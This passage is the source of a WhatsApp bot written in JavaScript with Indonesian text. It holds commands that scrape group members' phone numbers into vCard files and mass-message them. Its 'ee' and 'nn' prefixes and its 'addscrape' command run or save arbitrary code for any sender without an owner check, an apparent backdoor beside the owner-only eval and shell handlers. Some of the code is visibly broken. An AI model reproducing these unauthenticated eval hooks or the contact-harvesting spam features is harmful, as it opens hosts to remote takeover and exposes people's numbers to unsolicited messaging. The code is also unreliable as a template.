 img.exif = exif;
 return await img.save(null);
 }
 

 var stiker = false
 try {
 let [packname, ...author] = q.split('|')
 //var author = (author []).join('|')
 let mime = m.quoted.mimetype || ''
 if (!/webp/.test(mime)) throw m.reply('Reply sticker!')
 //let img = await q.download()
 let img = await ptz.downloadAndSaveMediaMessage(quoted, makeid(5))
 if (!img) throw 'Reply a sticker!'
 var stiker = await addExifAvatar(img, `ziyo`, `${pushname}`)
 } catch (e) {
 console.error(e)
 if (Buffer.isBuffer(e)) stiker = e
 } finally {
 if (stiker) ptz.sendMessage(m.chat, {
 sticker: stiker
 }, {
 quoted: m
 })
 else throw 'reply sticker'
 }
 }
 
 break







case "addscrape":
if (!text) return reply(` *Example :* ${prefix + command} y2mateid`)
 try {
 if (!m.quoted.text) return m.reply(`🚩 Reply Code Message!`)
 let path = `./lib/${text}.js`
 await fs.writeFileSync(path, m.quoted.text)
 reply(`🚩 Saved in ${path}`)
 } catch (error) {
 console.log(error)
 m.reply("🚩 Reply Code Message!")
 }
break

case "setgoodbye": 
 if (!text) throw "Masukan Deskripsi nya"
 chatdb.setgoodbye = text
 m.reply("Succes")
 break
case 'addcase': {
                if (!isCreator) return reply('?')
    if (!text) return ('Tambahkan case yang ingin di masukan');
const namaFile = './message.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Error File:', err);
            } else {
                reply('Sukses Menambahkan case');
            }
        });
    } else {
        reply('Gagal Menambahkan case');
    }
});

}
break;
case 'gimage': case "ai-search":{
if (!text) return reply(`Example : ${prefix + command} ganyu genshin impact`)
let gis = require('g-i-s')
gis(text, async (error, result) => {
let n = result
let images = n[Math.floor(Math.random() * n.length)].url
ptz.sendMessage(m.chat, { image: images, caption: `${text}`}, { quoted:fsaluran })
})
}
break

    
    
    
    
    
    
   
    
    
   
    
    
    
    
    
    
    // pushkontak 
    
  // KNP GA ADA REPLY ATAU BALASAN PROSES? , KARNA SAYA INGIN KE 1 TUJUAN DAN GA NGABISIN WAKTU
  
  // zio
  
      case "cekidgc": case "listgroup": {
if (!isPremium) return reply("Ouh")
let getGroups = await ptz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `*${m2}[ LIST GROUP DI BAWAH ]${m2}*

const idnyahrooo = metadata2.id.replace(/@g\.us/g, '')
`
for (let x of anu) {
let metadata2 = await ptz.groupMetadata(x)
teks += `\n•─ ─────────── ─•
⟡ Nama : ${metadata2.subject}
⟡ ID : ${idnyahrooo}
⟡ Member : ${metadata2.participants.length}
•─ ─────────── ─•\n`
}
reply(teks)
}
break
case "pushkontakv1":{
if (!isCreator) return m.reply("Ouh")
if (isGroup) return reply("Kusus di Chat Pribadi")
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)

const groupMetadataa = !isGroup? await ptz.groupMetadata(`${text.split("|")[0]}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkon = text.split("|")[1]
if (isContacts) return
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await ptz.downloadAndSaveMediaMessage(quoted)
memk = await TelegraPh(media)
await ptz.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(1000)
} else {
await ptz.sendMessage(mem, { text: global.tekspushkon })
await sleep(1000)
}
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:KONTAK KE ${createSerial(1)}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await ptz.sendMessage(m.chat, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break
case "pushkontakv2":{
if (!isCreator) return reply("Ouh")
if (!isGroup) return reply("Khusu Di Group")
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)

const groupMetadata = isGroup? await ptz.groupMetadata(m.chat).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv2 = text
if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await ptz.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)

setTimeout(async () => {
 ptz.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
}, 2100)
} else {
setTimeout(async () => {
ptz.sendMessage(men, { text: global.tekspushkonv2 })
}, 2100)
}
}
reply("File Kontak Sudah Di Kirim Lewat Chat Pribadi")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:KONTAK KE ${createSerial(1)}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await ptz.sendMessage(sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break
case "pushkontakv3":
if (!isCreator) return reply("Ouh")
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|jeda|teks\nUntuk Liat Id Group Silahkan Ketik .idgroup`)
console.log("?") //   ini pengalih
const groupMetadataa = !isGroup? await ptz.groupMetadata(`${q.split("|")[0]}`).catch(e => {}) : ""
const participantss = !isGroup? await groupMetadataa.participants : ""
const halls = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv3 = q.split("|")[2]
for (let mem of halls) {
if (/image/.test(mime)) {
media = await ptz.downloadAndSaveMediaMessage(quoted)
memk = await TelegraPh(media)

setTimeout(async () => {
 ptz.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv3 })
}, q.split("|")[1])

} else {
setTimeout(async () => {
ptz.sendMessage(mem, { text: global.tekspushkonv3 })
}, q.split("|")[1])
}
}
reply("sukses")
break
case "pushkontakv4":
if (!isCreator) return reply("Ouh")
if (isGroup) return reply("Khusu Di Chat Private")
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} jeda|teks`)
console.log('?') // ini juga pengalih
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv4 = text.split("|")[1]
for (let men of halsss) {
if (/image/.test(mime)) {
media = await ptz.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPH(media)

setTimeout(async () => {
 ptz.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv4 })
}, text.split("|")[0])
} else {
setTimeout(async () => {
await ptz.sendMessage(men, { text: global.tekspushkonv4 })
}, text.split("|")[0])
}
}
reply("Sukses")
break
case "savecontactv1": {
if (!isCreator) return reply("Ouh")
if (!text) return reply(`Maaf Kak Fitur ${prefix+command} Hanya Bisa Di Gunakan Di Dalam Group\nUntuk Memasukan Bot Ke Dalam Group Yang Di Ingin Kan\nSilahkan Ketik Command .join linkgroup`)

const groupMetadata = isGroup? await ptz.groupMetadata(m.chat).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (isContacts) return
contacts.push(men)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}
reply("Sukses File Sudah Di Kirim Lewat Chat Private")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:KONTAK KE ${createSerial(2)}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await ptz.sendMessage(sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break
case 'getcontact': case 'getkontak':
if (!isPremium) return reply("Ouh")
if (!isGroup) return m.reply(`Khusus Group`)
huhuhs = await ptz.sendMessage(m.chat, {
    text: `Grup; *${groupMetadata.subject}*\nTotal peserta; *${participants.length}*\n\nSending contact...`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000) 
ptz.sendContact(m.chat, participants.map(a => a.id), huhuhs)
break
case 'savekontak': case 'svkontak':
if (!isCreator) return reply("Ouh")
if (!isGroup) return m.reply(`Khusus Group`)
let cmiggc = await ptz.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './database/contacts.vcf'
reply('*Mengimpor '+cmiggc.participants.length+' kontak..*')
fs.writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
ptz.sendMessage(m.chat, {
    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'GROUP: *'+cmiggc.subject+'*\nMEMBER: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(nmfilect)
break
case 'sendkontak': case 'kontak':
if (!isCreator) return reply("Ouh")
if (!isGroup) return m.reply("Harus di  grup")
if (!m.mentionedJid[0]) return reply('Example: .kontak @tag|nama')
let snTak = dtext.split(' ')[1] ? dtext.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split("@")[0]+":"+m.mentionedJid[0].split("@")[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
}
ptz.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
break
case "savecontactv2": {
if (!isCreator) return reply("Ouh")
if (isGroup) return reply("Khusus Di Chat Private")
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)

const groupMetadataa = !isGroup? await ptz.groupMetadata(`${text}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:KONTAK KE ${createSerial(2)}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await ptz.sendMessage(m.chat, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break
    
    
    // jangan oplek
    case 'addowner': {
if (!isCreator) return m.reply("Kamu belum jadi owner")
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6831#####`)
prem1 = text.replace(/[^0-9]/g, '')
let cek1 = await ptz.onWhatsApp(prem1 + `@s.whatsapp.net`)
if (cek1.length == 0) return (`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
newowner.push(prem1)
fs.writeFileSync('./database/owner.json', JSON.stringify(newowner))
m.reply(`*${prem1} Telah menjadi owner*`)
}
break

case 'delowner': {
if (!isCreator) return m.reply("Kamu belum jadi owner")
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6831#####`)
prem2 = text.replace(/[^0-9]/g, '')
unp = newowner.indexOf(prem2)
newowner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(newowner))
m.reply(`*${prem2} Tidak lagi Menjadi owner*`)
}
break
case 'veemon':
        let chattttkkkkk = db.data.chats[m.chat];
    let argsssskkkkk = m.text.split(' ');
    
            await handleVeemonCommand(m, chattttkkkkk, argsssskkkkk);
            break;
    // ====== //
default:
 if (db.data.chats[chatId].simi) {
              let chait = db.data.chats[chatId]
    await handleSimiCommand(m, chait, ['simi']);
            } 
            
           if (db.data.chats[chatId].Veemon) {
              let chait = db.data.chats[chatId]
    handleVeemonCommand(m, chait, ['veemon']);
            } 
            
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m?.reply(bang)
}
try {
m?.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m?.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m?.reply(require('util').format(teks))
}
}
    

if (budy.startsWith('ee')) {
if (!text) return 
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m?.reply(require('util').format(teks))
}
}
    
if (body.startsWith("nn")) {
        if (!q) return m.reply('codenya mana kak')
        syntaxerror = require('syntax-error')
        _syntax = ''
        _text = args.join(' ')
        try {
          evalll = await eval(`;(async () => { return ${args.join(' ')} })()`)
          m.reply(require('util').format(evalll))
        } catch (e) {
          let err = await syntaxerror(_text, 'Execution Function', {
            allowReturnOutsideFunction: true,
            allowAwaitOutsideFunction: true
          })
          if (err) _syntax = '```' + err + '```\n\n'
          _return = e
          await m.reply(_syntax + require('util').format(_return))
        }
      }

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}

if ((m?.mtype === 'groupInviteMessage' || m?.text.startsWith('Undangan untuk bergabung') || m?.text.startsWith('Invitation to join') || m?.text.startsWith('Buka tautan ini')) && !m?.isBaileys && !m?.isGroup) {
await ptz.sendMessage(m?.chat, {react: {text: `🤨`,key: m?.key,}})
let teks = 'group apa itu'
reply(teks)
}

if (!m?.fromMe & !m?.isGroup) {
let user = global.db.data.users[m?.sender];
const cooldown = 21600000;
if (new Date() - user.pc < cooldown) return; 
let caption = `*Halo @${m?.sender.split("@")[0]} ${ucapanWaktu}* , Namaku Veemon Multi Device\n\nDi Buat Oleh *zio* Bot Ini bisa Melakukan Macam" Interaksi, Memulai ? Ketik .menu`.trim();
ptz.sendMessage(m?.chat,{text:caption,mentions:[m?.sender]},{quoted:fsaluran})
user.pc = new Date() * 1;
}
}
} catch (err) {
console.log('Button Request •')
console.log('Not Fuction Response:')
console.log(util.format(err))
    setTimeout(() => {
              console.clear()
        cfont.say('<- Veemon ->', {
    font: 'chrome',
    align: 'left',
    colors: ['blue','white'],
    background: 'white',
    letterSpacing: 1,
    lineHeight: 1,
    space: false,
    maxLength: '20',
});
console.log(chalk.blue(` ‎ ‎  Veemon - Multi Device • Ziyo Official\n ‎ ‎${chalk.white("Created Only One Dev, No have Team - Ziyo")}`))
    console.log(chalk.white(' ‎ ‎_____________________________________\n'))
               }, 6000)
}
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(color(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
